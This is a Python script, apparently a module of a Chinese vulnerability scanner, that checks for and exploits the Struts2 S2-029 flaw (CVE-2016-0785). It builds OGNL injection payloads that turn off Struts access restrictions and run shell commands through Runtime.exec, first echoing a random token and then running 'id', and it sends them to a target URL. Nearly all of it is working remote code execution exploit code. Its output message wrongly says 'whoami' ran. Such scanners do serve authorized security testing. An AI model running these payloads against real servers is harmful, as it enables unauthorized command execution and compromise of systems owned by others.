#!/usr/bin/env python3

'''
name: Struts2 S2-029漏洞，又名CVE-2016-0785漏洞
description: Struts2 S2-029漏洞可执行任意命令
'''

import re
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_029_BaseVerify:
    def __init__(self, url):
        self.url = url 
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Connection': "keep-alive",
                   "Content-Type": "application/x-www-form-urlencoded"
                  }
        self.check_payload = '''?message=(%23_memberAccess%5B'allowPrivateAccess'%5D=true,%23_memberAccess%5B'allowProtectedAccess'%5D=true,%23_memberAccess%5B'excludedPackageNamePatterns'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'excludedClasses'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'allowPackageProtectedAccess'%5D=true,%23_memberAccess%5B'allowStaticMethodAccess'%5D=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo%20''' + self.capta +'''\').getInputStream()))'''
        self.cmd_payload = '''?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))'''
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            check_req_text = check_req.text.replace('\n', '')
            check_req_text = check_req_text.replace(' ', '')
            check_result = re.findall('<input.*?value="(.*?)".*?/>', check_req_text)
            if self.capta in check_result:
                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                cmd_req_text = cmd_req.text.replace('\n', '')
                cmd_req_text = cmd_req_text.replace(' ', '')
                cmd_result = re.findall('<input.*?value="(.*?)".*?/>', cmd_req_text)
                print('存在S2-029漏洞,执行whoami命令成功，结果为：', cmd_result)
                return True
            else:
                print('不存在S2-029漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass
if  __name__ == "__main__":
    S2_029 = S2_029_BaseVerify('http://192.168.30.242:8888/S2-029/default.action')
    S2_029.run()
